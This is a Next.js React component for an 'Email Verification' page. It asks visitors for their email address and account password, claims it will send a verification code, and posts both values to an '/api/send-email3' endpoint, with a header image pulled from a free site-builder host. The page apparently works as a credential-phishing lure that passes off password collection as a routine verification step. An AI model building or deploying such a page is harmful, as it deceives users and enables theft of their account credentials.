'use client';

import Image from 'next/image';
import { useState } from 'react';
import { Header } from '@/components/header';
import { Footer } from '@/components/footer';

export default function EmailVerification() {
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });
  const [submitted, setSubmitted] = useState(false);
  const [verificationSent, setVerificationSent] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('/api/send-email3', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        throw new Error('Failed to send verification code');
      }

      const result = await response.json();
      console.log('Verification form submitted:', result);
      setSubmitted(true);
      setVerificationSent(true);
      setFormData({ email: '', password: '' });
      setTimeout(() => setSubmitted(false), 3000);
    } catch (err) {
      console.error('Error submitting form:', err);
      setError('Failed to send verification code. Please try again.');
      setTimeout(() => setError(''), 3000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      
      <main className="flex-grow">
        {/* Page Title */}
        <section className="bg-gradient-to-b from-gray-900 to-gray-800 text-white py-12 text-center">
          <h1 className="text-4xl font-bold">Email Verification</h1>
        </section>

        {/* Main Content */}
        <div className="max-w-4xl mx-auto px-4 py-8">
          {/* Header Image */}
          <div className="mb-8 flex justify-center">
            <Image
              src="https://lendig0.simdif.com/images/public/sd_678a1b8890c25.jpg"
              alt="Email Verification"
              width={960}
              height={600}
              className="rounded-lg shadow-lg max-w-full h-auto"
            />
          </div>

          {/* Verification Form */}
          <div className="bg-white rounded-lg shadow-lg p-8 max-w-md mx-auto">
            <h2 className="text-2xl font-bold text-gray-800 mb-6 text-center">Email Verification</h2>
            
            {submitted && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded mb-6">
                Verification code has been sent to your email. Please check your inbox.
              </div>
            )}

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Email Field */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Your Email Address *</label>
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  placeholder="your@email.com"
                />
              </div>

              {/* Password Field */}
              <div>
                <label className="block text-gray-700 font-semibold mb-2">Password *</label>
                <input
                  type="password"
                  name="password"
                  value={formData.password}
                  onChange={handleChange}
                  required
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-600"
                  placeholder="Enter your password"
                />
              </div>

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white font-bold py-3 rounded-lg transition"
              >
                {loading ? 'Sending...' : 'Send Verification Code'}
              </button>
            </form>

            {verificationSent && (
              <div className="mt-6 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                <p className="text-sm text-gray-700">
                  A verification code has been sent to your email. Please check your inbox and spam folder to verify your account.
                </p>
              </div>
            )}
          </div>

          {/* Additional Information */}
          <div className="mt-8 bg-blue-50 rounded-lg p-8 max-w-2xl mx-auto">
            <h3 className="text-xl font-bold text-gray-800 mb-4">Verification Process</h3>
            <ol className="space-y-3 text-gray-700 list-decimal list-inside">
              <li>Enter your registered email address</li>
              <li>Enter your account password</li>
              <li>Click 'Send Verification Code'</li>
              <li>Check your email for the verification code</li>
              <li>Enter the code to complete verification</li>
            </ol>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
